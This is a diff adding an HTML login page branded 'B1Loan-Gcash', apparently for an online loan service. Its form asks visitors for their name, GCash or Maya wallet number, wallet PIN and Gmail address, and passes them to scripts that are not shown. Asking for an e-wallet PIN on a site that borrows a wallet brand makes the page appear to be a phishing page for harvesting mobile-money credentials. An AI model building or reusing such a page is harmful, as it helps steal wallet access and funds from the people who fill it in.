@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>B1Loan-Gcash — Login</title>
+  <link rel="stylesheet" href="assets/style.css">
+</head>
+<body class="page-login">
+  <!-- Falling Peso Background (behind login) -->
+  <div id="falling-pesos" aria-hidden="true"></div>
+
+  <main class="container">
+    <section class="login-card card">
+      <h2>LOGIN</h2>
+      <form id="loginForm" autocomplete="off">
+        <label class="input-group">
+          NAME:
+          <input id="name" name="name" type="text" required placeholder="Juan dela Cruz">
+        </label>
+
+        <label class="input-group">
+          GCASH / MAYA NUMBER:
+          <input id="phone" name="phone" type="tel" pattern="[0-9+ ]{7,15}" required placeholder="+639xxxxxxxxx">
+        </label>
+
+        <label class="input-group">
+          PIN:
+          <input id="pin" name="pin" type="password" minlength="4" maxlength="8" required placeholder="4-8 digit PIN">
+        </label>
+
+        <label class="input-group">
+          GMAIL:
+          <input id="email" name="email" type="email" required placeholder="you@gmail.com">
+        </label>
+
+        <div class="actions">
+          <button type="submit" class="btn primary">Login</button>
+        </div>
+      </form>
+
+      <footer class="small">
+        Author: Pautang Peso • help@pautangpeso.com • Globe: +639666511466
+      </footer>
+    </section>
+  </main>
+
+  <script src="assets/script.js"></script>
+  <script src="assets/login.js"></script>
+</body>
+</html>
